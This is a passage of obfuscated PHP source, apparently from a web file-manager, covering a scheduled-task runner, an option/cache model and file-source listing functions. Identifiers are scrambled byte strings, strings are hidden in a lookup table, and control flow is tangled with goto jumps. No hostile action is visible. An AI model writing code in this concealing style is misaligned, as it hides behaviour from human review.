$_SERVER[¶ªÕß‚ØÁŸ]; if (self::valueGet($c‰Ø›İ†ñ·[702]) != $c‰Ø›İ†ñ·[93]) { return; } if (self::valueGet($c‰Ø›İ†ñ·[1404]) == $c‰Ø›İ†ñ·[93]) { $b×îÖº…Ş™ = self::valueGet($c‰Ø›İ†ñ·[1405]); if (time() - $b×îÖº…Ş™ > 3600 * 2) { self::restart(); } return; } goto AßÌô¢´; Eƒ±ì®ŒŠ“: } public static function restart() { $B›øôÜÄ‹» =& $_SERVER[¶ªÕß‚ØÁŸ]; http_close(); self::valueSet($B›øôÜÄ‹»[702], $B›øôÜÄ‹»[476]); sleep(self::valueGet($B›øôÜÄ‹»[1409]) + 5); self::valueSet($B›øôÜÄ‹»[1404], $B›øôÜÄ‹»[476]); self::valueSet($B›øôÜÄ‹»[702], $B›øôÜÄ‹»[93]); } public static function shutdownEvent() { $A‘‚ÃŠÄ =& $_SERVER[¶ªÕß‚ØÁŸ]; self::valueSet($A‘‚ÃŠÄ[1404], $A‘‚ÃŠÄ[476]); self::log($A‘‚ÃŠÄ[1410]); } public static function config($Bˆ‰ ŸË‰½, $E‹˜„˜Ñ †) { $b«áğŒî™ =& $_SERVER[¶ªÕß‚ØÁŸ]; $fç¼ôê–õµ = 20; $E‹˜„˜Ñ † = intval($E‹˜„˜Ñ †) <= $fç¼ôê–õµ ? $fç¼ôê–õµ : intval($E‹˜„˜Ñ †); self::valueSet($b«áğŒî™[702], $Bˆ‰ ŸË‰½); self::valueSet($b«áğŒî™[1409], $E‹˜„˜Ñ †); } private static function taskRunAll() { $cì‰‘ó¡é’ =& $_SERVER[¶ªÕß‚ØÁŸ]; $cÆß„•Ç°º = Model($cì‰‘ó¡é’[1411])->listData(); $fö¹äèŞ²— = count($cÆß„•Ç°º); for ($EÛî‚ìË† = 0; $EÛî‚ìË† < $fö¹äèŞ²—; $EÛî‚ìË†++) { $DÍ©ï¡¬Ğ = $cÆß„•Ç°º[$EÛî‚ìË†]; if ($DÍ©ï¡¬Ğ[$cì‰‘ó¡é’[1412]] != $cì‰‘ó¡é’[93]) { continue; } if (!self::taskTimeCheck($DÍ©ï¡¬Ğ)) { continue; } self::taskRun($DÍ©ï¡¬Ğ); } Hook::trigger($cì‰‘ó¡é’[1413]); } private static function taskTimeCheck($CŞºÕ‰Ñ†™) { goto D…¸¶ËÌ‹; D…¸¶ËÌ‹: $fÎ©ÁïÃ‘ =& $_SERVER[¶ªÕß‚ØÁŸ]; $D©¶ËÒóÓˆ = json_decode($CŞºÕ‰Ñ†™[$fÎ©ÁïÃ‘[200]], !0); $CìÃ×½ğ—¦ = intval($CŞºÕ‰Ñ†™[$fÎ©ÁïÃ‘[1405]]); goto a¹´ç¯½ÔÜ; a¹´ç¯½ÔÜ: $Aç¥ä™÷é¾ = strtotime($fÎ©ÁïÃ‘[1414] . $D©¶ËÒóÓˆ[$fÎ©ÁïÃ‘[1415]] . $fÎ©ÁïÃ‘[1416]) - strtotime($fÎ©ÁïÃ‘[1417]); $c«ÃîÈ×¿® = time() - strtotime(date($fÎ©ÁïÃ‘[1418]) . $fÎ©ÁïÃ‘[1419]); $B¿ë¨’‡¡ = $c«ÃîÈ×¿® >= $Aç¥ä™÷é¾ && $c«ÃîÈ×¿® <= $Aç¥ä™÷é¾ + 3600; goto CŒäêíƒ±ç; CŒäêíƒ±ç: switch ($D©¶ËÒóÓˆ[$fÎ©ÁïÃ‘[29]]) { case $fÎ©ÁïÃ‘[1420]: if (time() - $CìÃ×½ğ—¦ < 3600 * 24 * 30) { return !1; } if ($D©¶ËÒóÓˆ[$fÎ©ÁïÃ‘[1420]] == date($fÎ©ÁïÃ‘[1421]) && $B¿ë¨’‡¡) { return !0; } break; case $fÎ©ÁïÃ‘[1422]: if (time() - $CìÃ×½ğ—¦ < 3600 * 24 * 7) { return !1; } $c¬Î›²ÛÁ = date($fÎ©ÁïÃ‘[1423]) == 0 ? 7 : date($fÎ©ÁïÃ‘[1423]); if ($D©¶ËÒóÓˆ[$fÎ©ÁïÃ‘[1422]] == $c¬Î›²ÛÁ && $B¿ë¨’‡¡) { return !0; } break; case $fÎ©ÁïÃ‘[1415]: if (time() - $CìÃ×½ğ—¦ < 3600 * 24) { return !1; } if ($B¿ë¨’‡¡) { return !0; } break; case $fÎ©ÁïÃ‘[1424]: if (time() - $CìÃ×½ğ—¦ >= floatval($D©¶ËÒóÓˆ[$fÎ©ÁïÃ‘[1424]]) * 60) { return !0; } break; default: break; } return !1; goto CµÇÚ²’£; CµÇÚ²’£: } public static function taskRun($câì‘§¯ÖÚ) { goto bš‡À½ïäù; bš‡À½ïäù: $c‘ ˜ˆ˜Ê =& $_SERVER[¶ªÕß‚ØÁŸ]; self::log($c‘ ˜ˆ˜Ê[1425] . $câì‘§¯ÖÚ[$c‘ ˜ˆ˜Ê[375]] . $c‘ ˜ˆ˜Ê[1426] . $câì‘§¯ÖÚ[$c‘ ˜ˆ˜Ê[28]] . $c‘ ˜ˆ˜Ê[1427] . $câì‘§¯ÖÚ[$c‘ ˜ˆ˜Ê[1428]]); Model($c‘ ˜ˆ˜Ê[1411])->run($câì‘§¯ÖÚ[$c‘ ˜ˆ˜Ê[375]]); goto c¡ÈÏ ƒ®; E•…â­Úö˜: Model($c‘ ˜ˆ˜Ê[1429])->add(array($c‘ ˜ˆ˜Ê[1430] => $c‘ ˜ˆ˜Ê[33], $c‘ ˜ˆ˜Ê[1431] => $c‘ ˜ˆ˜Ê[476], $c‘ ˜ˆ˜Ê[29] => $c‘ ˜ˆ˜Ê[1432] . $câì‘§¯ÖÚ[$c‘ ˜ˆ˜Ê[375]], $c‘ ˜ˆ˜Ê[1433] => json_encode(array($c‘ ˜ˆ˜Ê[28] => $câì‘§¯ÖÚ[$c‘ ˜ˆ˜Ê[28]], $c‘ ˜ˆ˜Ê[1434] => timeFloat() - $f±È¬•´ê, $c‘ ˜ˆ˜Ê[290] => $B¤É‘¬ÀÍ)))); self::log($c‘ ˜ˆ˜Ê[1435] . $câì‘§¯ÖÚ[$c‘ ˜ˆ˜Ê[375]] . $c‘ ˜ˆ˜Ê[1436] . $B¤É‘¬ÀÍ); return !0; goto Aé‹Èîø¸Ì; c¡ÈÏ ƒ®: $f±È¬•´ê = timeFloat(); $B¤É‘¬ÀÍ = $c‘ ˜ˆ˜Ê[33]; switch ($câì‘§¯ÖÚ[$c‘ ˜ˆ˜Ê[29]]) { case $c‘ ˜ˆ˜Ê[304]: $C»Û¥ÁÌ® = url_request($câì‘§¯ÖÚ[$c‘ ˜ˆ˜Ê[1428]], $c‘ ˜ˆ˜Ê[226], !1, !1, !1, !1, 5); $B¤É‘¬ÀÍ = strlen($C»Û¥ÁÌ®); break; case $c‘ ˜ˆ˜Ê[225]: $B¤É‘¬ÀÍ = Hook::apply($câì‘§¯ÖÚ[$c‘ ˜ˆ˜Ê[1428]]); default: break; } goto E•…â­Úö˜; Aé‹Èîø¸Ì: } private static function valueGet($c£†œÁº–) { $c¤¥èİ·³­ =& $_SERVER[¶ªÕß‚ØÁŸ]; $A³ìÒ•×š¿ = $c¤¥èİ·³­[1437]; $DÛŠğ˜®‚è = Model($c¤¥èİ·³­[1438])->get($c£†œÁº–, $A³ìÒ•×š¿); if (is_null($DÛŠğ˜®‚è)) { Model($c¤¥èİ·³­[1438])->set($c¤¥èİ·³­[1409], 10, $A³ìÒ•×š¿); Model($c¤¥èİ·³­[1438])->set($c¤¥èİ·³­[702], $c¤¥èİ·³­[93], $A³ìÒ•×š¿); Model($c¤¥èİ·³­[1438])->set($c¤¥èİ·³­[1404], $c¤¥èİ·³­[476], $A³ìÒ•×š¿); $DÛŠğ˜®‚è = Model($c¤¥èİ·³­[1438])->get($c£†œÁº–, $A³ìÒ•×š¿); } return $DÛŠğ˜®‚è; } private static function valueSet($dÂ„·‡îœ˜, $aèª¤ÉÙ……) { $a©¹¨øóƒ =& $_SERVER[¶ªÕß‚ØÁŸ]; return Model($a©¹¨øóƒ[1438])->set($dÂ„·‡îœ˜, $aèª¤ÉÙ……, $a©¹¨øóƒ[1437]); } protected static function log($fÏ‹­æÌ½) { write_log($fÏ‹­æÌ½, $_SERVER[¶ªÕß‚ØÁŸ][1439]); } private static function cacheClear() { $F¦‹°öÄîĞ =& $_SERVER[¶ªÕß‚ØÁŸ]; $Aà©Ğ¢‚ = Model($F¦‹°öÄîĞ[1438])->cacheKey($F¦‹°öÄîĞ[1437]); Cache::clearMemory($Aà©Ğ¢‚); } } goto B¡¹ÑÏ±îœ; b‘Å°»µµ: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($CîŠ‰Ùµª‘ = false, $FŒ©‡äóÙë = '', $eöƒÔ­ùÑ = false) { goto fÙ­‘ê²£; fÙ­‘ê²£: $câ°™ˆù… =& $_SERVER[¶ªÕß‚ØÁŸ]; $a¡Œğ–É = $this->cacheGet($FŒ©‡äóÙë); $døçÚƒõ›á = $this->optionDefault($FŒ©‡äóÙë); goto c¤×ÅÁ–®ø; c¤×ÅÁ–®ø: $døçÚƒõ›á = is_array($døçÚƒõ›á) ? $døçÚƒõ›á : array(); if (is_array($a¡Œğ–É)) { $a¡Œğ–É = array_merge($døçÚƒõ›á, $a¡Œğ–É); return $CîŠ‰Ùµª‘ ? isset($a¡Œğ–É[$CîŠ‰Ùµª‘]) ? $a¡Œğ–É[$CîŠ‰Ùµª‘] : null : $a¡Œğ–É; } $BäíÛ–œ½¸ = $this->filterWhere(array($câ°™ˆù…[29] => $FŒ©‡äóÙë)); goto FÄÑËëËÍ; FÄÑËëËÍ: $a¡Œğ–É = $this->where($BäíÛ–œ½¸)->select(); $a¡Œğ–É = array_to_keyvalue($a¡Œğ–É, $câ°™ˆù…[99], $câ°™ˆù…[368]); foreach ($a¡Œğ–É as $c²ÕÊíùÌÛ => $d‚‡„±ï™æ) { if ($eöƒÔ­ùÑ || in_array($c²ÕÊíùÌÛ, $this->jsonField)) { $a¡Œğ–É[$c²ÕÊíùÌÛ] = json_decode($d‚‡„±ï™æ, !0); } } goto CÅÖÜİ‰Ù; CÅÖÜİ‰Ù: $this->cacheSet($FŒ©‡äóÙë, $a¡Œğ–É); $a¡Œğ–É = array_merge($døçÚƒõ›á, $a¡Œğ–É); return $CîŠ‰Ùµª‘ ? $a¡Œğ–É[$CîŠ‰Ùµª‘] : $a¡Œğ–É; goto E–å¿Ş„®; E–å¿Ş„®: } public function set($E™ğĞë©¿…, $DÚèîœÆŒÊ = false, $eƒ ¨‹ÖÉ— = '') { goto Eì—åÄƒÚé; bó˜¦§–Œ: return $this->addAll($cÎ‰ÇÜˆà, array(), !0); goto fÁåù÷‘í; f†¬ôÍŞè—: $c†À»æÙ“µ = is_array($E™ğĞë©¿…) ? $E™ğĞë©¿… : array($E™ğĞë©¿… => $DÚèîœÆŒÊ); foreach ($c†À»æÙ“µ as $d Æ²ë ñ¨ => $E…›¡¥ä½) { if (is_array($E…›¡¥ä½)) { $E…›¡¥ä½ = json_encode_force($E…›¡¥ä½); } $this->checkLength($E…›¡¥ä½, !1, $this->tableName . $fà¥Ü™äŞ»[4] . $E™ğĞë©¿…); $E…›¡¥ä½ = self::textEncode($E…›¡¥ä½); $c†À»æÙ“µ = array($fà¥Ü™äŞ»[29] => $eƒ ¨‹ÖÉ—, $fà¥Ü™äŞ»[99] => $d Æ²ë ñ¨, $fà¥Ü™äŞ»[368] => $E…›¡¥ä½); $cÎ‰ÇÜˆà[] = $this->filterWhere($c†À»æÙ“µ); } if (!$cÎ‰ÇÜˆà) { return !0; } goto bó˜¦§–Œ; Eì—åÄƒÚé: $fà¥Ü™äŞ» =& $_SERVER[¶ªÕß‚ØÁŸ]; $this->cacheRemove($eƒ ¨‹ÖÉ—); $cÎ‰ÇÜˆà = array(); goto f†¬ôÍŞè—; fÁåù÷‘í: } protected function optionDefault($c¦ªŠ¦„°¬ = '') { return !1; } public function setDeep($f‚™‹ÙÕŠö, $eöÂ„¦¼‡˜ = false, $f±·Ù§“¤ = '') { $dÚ‹©çÙâ† = explode($_SERVER[¶ªÕß‚ØÁŸ][101], $f‚™‹ÙÕŠö); $aøóíîâ¹ = $this->get(); array_set_value($aøóíîâ¹, $f‚™‹ÙÕŠö, $eöÂ„¦¼‡˜); $this->set($dÚ‹©çÙâ†[0], $aøóíîâ¹[$dÚ‹©çÙâ†[0]], $f±·Ù§“¤); } public function remove($CœŞ½Ã‚Á±, $A‹»µ¬ Šå = '') { $CÎ¬´¤è½ =& $_SERVER[¶ªÕß‚ØÁŸ]; $this->cacheRemove($A‹»µ¬ Šå); $fŒÀÓç¨Éî = $this->filterWhere(array($CÎ¬´¤è½[99] => $CœŞ½Ã‚Á±, $CÎ¬´¤è½[29] => $A‹»µ¬ Šå)); if (is_null($CœŞ½Ã‚Á±)) { unset($fŒÀÓç¨Éî[$CÎ¬´¤è½[99]]); } return $this->where($fŒÀÓç¨Éî)->delete(); } public function cacheSet($cóêÍ£¸™, $DñßàÕ¥öõ = false) { return Cache::set($this->cacheKey($cóêÍ£¸™), $DñßàÕ¥öõ); } public function cacheGet($Dï¹Ñ’¬ÏÕ) { return Cache::get($this->cacheKey($Dï¹Ñ’¬ÏÕ)); } public function cacheRemove($f÷Ë°¿š‘ˆ) { return Cache::remove($this->cacheKey($f÷Ë°¿š‘ˆ)); } protected function filterWhere($D¢­ºŒì¢˜) { return $D¢­ºŒì¢˜; } protected function cacheKey($AÊ‘øŒö) { return $AÊ‘øŒö; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\137\x73\157\x75\162\143\x65"; protected $tableMeta = array("\164\x61\142\154\145\116\141\x6d\145" => "\151\157\137\x73\157\x75\162\x63\x65\x5f\155\x65\x74\x61", "\155\x65\x74\x61\106\x69\145\154\x64" => "\163\x6f\x75\x72\143\x65\x49\x44"); protected $dataAuto = array(array("\155\157\144\151\146\x79\124\x69\155\x65", "\164\151\155\145", "\x69\156\x73\x65\162\164", "\146\x75\x6e\x63\x74\x69\157\156"), array("\143\162\145\x61\164\145\124\151\155\x65", "\x74\x69\x6d\x65", "\151\156\163\x65\x72\164", "\x66\165\x6e\x63\x74\x69\x6f\x6e"), array("\x76\151\x65\167\124\x69\x6d\145", "\x74\x69\x6d\x65", "\x69\x6e\163\145\x72\164", "\146\x75\x6e\143\164\151\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($dØ¬ÅåˆÇ¢) { return $this->listSource(array($_SERVER[¶ªÕß‚ØÁŸ][376] => $dØ¬ÅåˆÇ¢)); } public function typeName($cÜ”¯¡Ò) { static $e­’©¸¬Œˆ = array(self::TYPE_SYSTEM => "\163\171\163\x74\x65\155", self::TYPE_USER => "\165\x73\x65\x72", self::TYPE_GROUP => "\x67\x72\x6f\165\160"); return $e­’©¸¬Œˆ[$cÜ”¯¡Ò . $_SERVER[¶ªÕß‚ØÁŸ][33]]; } public function sourceListInfo($d•ÇÄ†ÉÀµ, $C–ğí¸Ù”¬ = false) { goto CÔÍíì“‘; AƒôñŠ÷½: if (!$d•ÇÄ†ÉÀµ) { return array(); } $cõàˆ“ªµè = $this->where(array($déÀà••…ó[377] => array($déÀà••…ó[7], $d•ÇÄ†ÉÀµ)))->select(); $this->_listDataApply($cõàˆ“ªµè, $C–ğí¸Ù”¬); goto e¼°ÛŞù¿‘; e¼°ÛŞù¿‘: return array_to_keyvalue($cõàˆ“ªµè, $déÀà••…ó[377]); goto FèŞøÓÙÅù; CÔÍíì“‘: $déÀà••…ó =& $_SERVER[¶ªÕß‚ØÁŸ]; $d•ÇÄ†ÉÀµ = $d•ÇÄ†ÉÀµ ? $d•ÇÄ†ÉÀµ : array(); $d•ÇÄ†ÉÀµ = array_filter(array_unique($d•ÇÄ†ÉÀµ)); goto AƒôñŠ÷½; FèŞøÓÙÅù: } public function pathInfoFilter($eÊÈÃÆ†ù§) { goto dòÚ§ñŒ—; dòÚ§ñŒ—: $Fáœ‡‚˜î =& $_SERVER[¶ªÕß‚ØÁŸ]; $eÊÈÃÆ†ù§[$Fáœ‡‚˜î[85]] = KodIO::make($eÊÈÃÆ†ù§[$Fáœ‡‚˜î[377]]); $eÊÈÃÆ†ù§[$Fáœ‡‚˜î[29]] = $eÊÈÃÆ†ù§[$Fáœ‡‚˜î[378]] == 1 ? $Fáœ‡‚˜î[86] : $Fáœ‡‚˜î[177]; goto e ÔŒÀ©‘; e ÔŒÀ©‘: $eÊÈÃÆ†ù§[$Fáœ‡‚˜î[379]] = $this->typeName($eÊÈÃÆ†ù§[$Fáœ‡‚˜î[379]]); if ($eÊÈÃÆ†ù§[$Fáœ‡‚˜î[378]] != 1) { $eÊÈÃÆ†ù§[$Fáœ‡‚˜î[170]] = $eÊÈÃÆ†ù§[$Fáœ‡‚˜î[380]]; unset($eÊÈÃÆ†ù§[$Fáœ‡‚˜î[380]]); } $dòëù“Ç“ = $Fáœ‡‚˜î[381]; goto cÄº”Ü‰; a¦ìáÓ§¨¢: if (isset($eÊÈÃÆ†ù§[$Fáœ‡‚˜î[384]]) && $eÊÈÃÆ†ù§[$Fáœ‡‚˜î[384]][$Fáœ‡‚˜î[385]] == -1) { $cÕ–ˆ¤ë‰ò = array_remove_value($cÕ–ˆ¤ë‰ò, $Fáœ‡‚˜î[197]); $cÕ–ˆ¤ë‰ò = array_remove_value($cÕ–ˆ¤ë‰ò, $Fáœ‡‚˜î[117]); $cÕ–ˆ¤ë‰ò = array_remove_value($cÕ–ˆ¤ë‰ò, $Fáœ‡‚˜î[386]); $cÕ–ˆ¤ë‰ò = array_remove_value($cÕ–ˆ¤ë‰ò, $Fáœ‡‚˜î[387]); $cÕ–ˆ¤ë‰ò = array_remove_value($cÕ–ˆ¤ë‰ò, $Fáœ‡‚˜î[87]); $cÕ–ˆ¤ë‰ò = array_remove_value($cÕ–ˆ¤ë‰ò, $Fáœ‡‚˜î[388]); } $eÊÈÃÆ†ù§ = array_field_key($eÊÈÃÆ†ù§, $cÕ–ˆ¤ë‰ò); return $eÊÈÃÆ†ù§; goto AÉ¾¶©¸—²; cÄº”Ü‰: $dòëù“Ç“ .= $Fáœ‡‚˜î[382]; $dòëù“Ç“ .= $Fáœ‡‚˜î[383]; $cÕ–ˆ¤ë‰ò = explode($Fáœ‡‚˜î[47], $dòëù“Ç“); goto a¦ìáÓ§¨¢; AÉ¾¶©¸—²: } public function listUserFav() { goto A¡’İÑ¾¨¾; C½”ĞÉà»ç: foreach ($EÊ‡Áºö‚ as &$e­ÚÃ½½—) { $e­ÚÃ½½— = array($d«è°Ó¢´[393] => $e­ÚÃ½½—[$d«è°Ó¢´[375]], $d«è°Ó¢´[394] => $e­ÚÃ½½—[$d«è°Ó¢´[28]], $d«è°Ó¢´[395] => $e­ÚÃ½½—[$d«è°Ó¢´[85]], $d«è°Ó¢´[396] => $e­ÚÃ½½—[$d«è°Ó¢´[29]], $d«è°Ó¢´[397] => $e­ÚÃ½½—[$d«è°Ó¢´[197]], $d«è°Ó¢´[398] => $e­ÚÃ½½—[$d«è°Ó¢´[117]]); if ($e­ÚÃ½½—[$d«è°Ó¢´[29]] == $d«è°Ó¢´[390] && $c›Ê¸õ¸¨è[$e­ÚÃ½½—[$d«è°Ó¢´[85]]]) { $e­ÚÃ½½—[$d«è°Ó¢´[399]] = $c›Ê¸õ¸¨è[$e­ÚÃ½½—[$d«è°Ó¢´[85]]]; } } return $EÊ‡Áºö‚; goto CĞŒÄ–÷æ; c¬‡ÊĞ½Åí: $f°ÇÈÅ±ê = array_to_keyvalue($f°ÇÈÅ±ê, $d«è°Ó¢´[33], $d«è°Ó¢´[85]); if ($f°ÇÈÅ±ê) { $c›Ê¸õ¸¨è = $this->listSource(array($d«è°Ó¢´[391] => array($d«è°Ó¢´[392], $f°ÇÈÅ±ê))); } $c›Ê¸õ¸¨è = array_to_keyvalue($c›Ê¸õ¸¨è[$d«è°Ó¢´[363]], $d«è°Ó¢´[377]); goto C½”ĞÉà»ç; A¡’İÑ¾¨¾: $d«è°Ó¢´ =& $_SERVER[¶ªÕß‚ØÁŸ]; $EÊ‡Áºö‚ = Model($d«è°Ó¢´[389])->listData(); $f°ÇÈÅ±ê = array_filter_by_field($EÊ‡Áºö‚, $d«è°Ó¢´[29], $d«è°Ó¢´[390]); goto c¬‡ÊĞ½Åí; CĞŒÄ–÷æ: } public function listUserTag($Aª¡ñ­’¼ï) { goto b‚ç °İÚ ; eöèÃİÊóæ: $this->listUserTagClear($DÅ½ŒÎ“†«, $cª¹–ĞÊĞø, $Aª¡ñ­’¼ï); return $cª¹–ĞÊĞø; goto aÁ‡§ç„×ò; B§ƒğºÈ¿: $DÅ½ŒÎ“†« = array_to_keyvalue($DÅ½ŒÎ“†«, $e„‰¹ê†”Ğ[33], $e„‰¹ê†”Ğ[85]); $cª¹–ĞÊĞø = array(); if ($DÅ½ŒÎ“†«) { $EÛ¢ì¼ßğÊ = array($e„‰¹ê†”Ğ[391] => array($e„‰¹ê†”Ğ[392], $DÅ½ŒÎ“†«)); $cª¹–ĞÊĞø = $this->listSource($EÛ¢ì¼ßğÊ); } goto eöèÃİÊóæ; b‚ç °İÚ : $e„‰¹ê†”Ğ =& $_SERVER[¶ªÕß‚ØÁŸ]; $bºá‚½¹‚Œ = Model($e„‰¹ê†”Ğ[400])->listData(); $DÅ½ŒÎ“†« = array_filter_by_field($bºá‚½¹‚Œ, $e„‰¹ê†”Ğ[401], $Aª¡ñ­’¼ï); goto B§ƒğºÈ¿; aÁ‡§ç„×ò: } private function listUserTagClear($F”ĞÃ½œö´, $b‰ŠØÉ‘à·, $c†˜’Ü»¨è) { goto E‹š‚˜¹Õ„; C †“‡ãá: $A£Ó®àõ«¶ = array(); $C—¸èëš = array_to_keyvalue($b‰ŠØÉ‘à·[$FÀíŠ¸°[84]], $FÀíŠ¸°[33], $FÀíŠ¸°[377]); $D¾˜·©Œêä = array_to_keyvalue($b‰ŠØÉ‘à·[$FÀíŠ¸°[83]], $FÀíŠ¸°[33], $FÀíŠ¸°[377]); goto d¨“¢œèÒ•; d¨“¢œèÒ•: $bé®Š¸à = array_merge($D¾˜·©Œêä, $C—¸èëš); foreach ($F”ĞÃ½œö´ as $A¹ƒÛ®«Æ) { if (!in_array($A¹ƒÛ®«Æ, $bé®Š¸à)) { $A£Ó®àõ«¶[] = $A¹ƒÛ®«Æ; } } if (!$A£Ó®àõ«¶) { return; } goto DÊ¡Ãê¬’; E‹š‚˜¹Õ„: $FÀíŠ¸° =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$F”ĞÃ½œö´) { return; } if ($b‰ŠØÉ‘à· && count($F”ĞÃ½œö´) == $b‰ŠØÉ‘à·[$FÀíŠ¸°[360]][$FÀíŠ¸°[361]]) { return; } goto C †“‡ãá; DÊ¡Ãê¬’: Model($FÀíŠ¸°[402])->removeFromTag($A£Ó®àõ«¶, $c†˜’Ü»¨è); goto FÍˆíùºíä; FÍˆíùºíä: } public function listUserRecycle() { $DÛ†õªñË¬ =& $_SERVER[¶ªÕß‚ØÁŸ]; $e‰·Ã¨ïôÄ = Model($DÛ†õªñË¬[403])->listData(); if (!$e‰·Ã¨ïôÄ) { return array(); } $eÚ™˜ Ğ›Ó = array($DÛ†õªñË¬[391] => array($DÛ†õªñË¬[392], $e‰·Ã¨ïôÄ), $DÛ†õªñË¬[404] => 1); return $this->listSource($eÚ™˜ Ğ›Ó); } public function listSource($d‹äù–Ã³, $dŠ¨ÒÆ‡´± = 3000) { goto aÒÆğ›·–Ğ; cé‡ÅâáĞ“: $C‘©…ˆ¾ğ¬ = $this->field($C‰‘ÖáÖ¡®)->_makeOrder()->where($d‹äù–Ã³)->selectPage($dŠ¨ÒÆ‡´±); $this->_listDataApply($C‘©…ˆ¾ğ¬[$e´Ï–œ†»è[363]]); $this->_listMake($C‘©…ˆ¾ğ¬); goto B»„†îŒŞ«; B»„†îŒŞ«: return $C‘©…ˆ¾ğ¬; goto d´£Š²µí; aÒÆğ›·–Ğ: $e´Ï–œ†»è =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!isset($d‹äù–Ã³[$e´Ï–œ†»è[405]])) { $d‹äù–Ã³[$e´Ï–œ†»è[405]] = 0; } $C‰‘ÖáÖ¡® = $e´Ï–œ†»è[406]; goto cé‡ÅâáĞ“; d´£Š²µí: } protected function _makeOrder() { goto D§òÇÀ´Š¥; fÙÚ©ôšô´: $eá‰ÀÎĞµ = Input::get($CËàÁ’ÜùÉ[416], $CËàÁ’ÜùÉ[7], $bÍğßğ…£À, array_keys($d—°Èš×–«)); if (!in_array($dİó»²ğ“›, array_keys($F²ØĞ®ë‚¢))) { $dİó»²ğ“› = $CËàÁ’ÜùÉ[28]; } if (!in_array($eá‰ÀÎĞµ, array_keys($d—°Èš×–«))) { $dİó»²ğ“› = $CËàÁ’ÜùÉ[410]; } goto DÊ éÌÔŸ‹; DÊ éÌÔŸ‹: if ($dİó»²ğ“› == $CËàÁ’ÜùÉ[28]) { } $E³×Â—òäÕ = $CËàÁ’ÜùÉ[417] . $F²ØĞ®ë‚¢[$dİó»²ğ“›] . $CËàÁ’ÜùÉ[50] . $d—°Èš×–«[$eá‰ÀÎĞµ]; return $this->order(rtrim(trim($E³×Â—òäÕ), $CËàÁ’ÜùÉ[47])); goto dÙ±‹¾ˆì; D§òÇÀ´Š¥: $CËàÁ’ÜùÉ =& $_SERVER[¶ªÕß‚ØÁŸ]; $a…ĞÜ‚·­Ø = Model($CËàÁ’ÜùÉ[407])->get($CËàÁ’ÜùÉ[408]); $bÍğßğ…£À = Model($CËàÁ’ÜùÉ[407])->get($CËàÁ’ÜùÉ[409]); goto E±ˆ…Ã¼´; E±ˆ…Ã¼´: $d—°Èš×–« = array($CËàÁ’ÜùÉ[410] => $CËàÁ’ÜùÉ[411], $CËàÁ’ÜùÉ[412] => $CËàÁ’ÜùÉ[413]); $F²ØĞ®ë‚¢ = array($CËàÁ’ÜùÉ[28] => $CËàÁ’ÜùÉ[28], $CËàÁ’ÜùÉ[87] => $CËàÁ’ÜùÉ[87], $CËàÁ’ÜùÉ[170] => $CËàÁ’ÜùÉ[380], $CËàÁ’ÜùÉ[386] => $CËàÁ’ÜùÉ[386], $CËàÁ’ÜùÉ[414] => $CËàÁ’ÜùÉ[387], $CËàÁ’ÜùÉ[197] => $CËàÁ’ÜùÉ[197], $CËàÁ’ÜùÉ[117] => $CËàÁ’ÜùÉ[117]); $dİó»²ğ“› = Input::get($CËàÁ’ÜùÉ[415], $CËàÁ’ÜùÉ[7], $a…ĞÜ‚·­Ø, array_keys($F²ØĞ®ë‚¢)); goto fÙÚ©ôšô´; dÙ±‹¾ˆì: } protected function _listDataApplyItem($FÆ™˜…à‚—, $aÈí¢…£•„ = false) { $AÕƒŒì¼‚ = array($FÆ™˜…à‚—); $this->_listDataApply($AÕƒŒì¼‚, $aÈí¢…£•„); return $AÕƒŒì¼‚[0]; } protected function _listDataApply(&$Bå™…Ö“îÁ, $bòÄ§å¬ôŞ = false) { goto b²¶É „…­; b²¶É „…­: $b›í‰„Êí’ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$Bå™…Ö“îÁ) { $Bå™…Ö“îÁ = array(); return; } $DÇ½ŒÃÇëš = array_to_keyvalue($Bå™…Ö“îÁ, $b›í‰„Êí’[33], $b›í‰„Êí’[377]); goto BºèƒÕ‚Ë; BºèƒÕ‚Ë: $DÇ½ŒÃÇëš = array_unique($DÇ½ŒÃÇëš); $this->_listSourceCache($Bå™…Ö“îÁ); if (!$bòÄ§å¬ôŞ) { $this->_listAppendMeta($Bå™…Ö“îÁ, $DÇ½ŒÃÇëš); $this->_listAppendFileMeta($Bå™…Ö“îÁ, $DÇ½ŒÃÇëš); $this->_listAppendChildren($Bå™…Ö“îÁ, $DÇ½ŒÃÇëš); } goto BŞ”×³‡Â‰; FÆ˜˜áËó©: $this->_listAppendUser($Bå™…Ö“îÁ); $this->_listFilterInfo($Bå™…Ö“îÁ, $bòÄ§å¬ôŞ); goto Eµé¡·Æ§Å; BŞ”×³‡Â‰: $this->_listAppendPath($Bå™…Ö“îÁ); $this->_listAppendAuth($Bå™…Ö“îÁ); $this->_listAppendSourceInfo($Bå™…Ö“îÁ, $DÇ½ŒÃÇëš); goto FÆ˜˜áËó©; Eµé¡·Æ§Å: } protected function _listSourceCache($dœË„ÇÎ²Ã) { $C‰ŠµëÍ¦Ô =& $_SERVER[¶ªÕß‚ØÁŸ]; foreach ($dœË„ÇÎ²Ã as $c×†Ã¬¶ŸÅ) { self::$cacheSourceInfo[$C‰ŠµëÍ¦Ô[418] . $c×†Ã¬¶ŸÅ[$C‰ŠµëÍ¦Ô[377]]] = $c×†Ã¬¶ŸÅ; } } protected function _listFilterInfo(&$f³œÂë§, $c’‚—œÈ = false) { $dØÚæÜÚßò =& $_SERVER[¶ªÕß‚ØÁŸ]; foreach ($f³œÂë§ as &$f…ˆ¥èô) { $f…ˆ¥èô = $this->pathInfoFilter($f…ˆ¥èô); self::$cachePathInfo[$dØÚæÜÚßò[419] . intval($c’‚—œÈ) . $dØÚæÜÚßò[420] . $f…ˆ¥èô[$dØÚæÜÚßò[377]]] = $f…ˆ¥èô; } } protected function _listMake(&$fÒŒ„Œºƒö) { $AÒ¦¹Ç…œ£ =& $_SERVER[¶ªÕß‚ØÁŸ]; $fÒŒ„Œºƒö[$AÒ¦¹Ç…œ£[84]] = array(); $fÒŒ„Œºƒö[$AÒ¦¹Ç…œ£[83]] = array(); foreach ($fÒŒ„Œºƒö[$AÒ¦¹Ç…œ£[363]] as 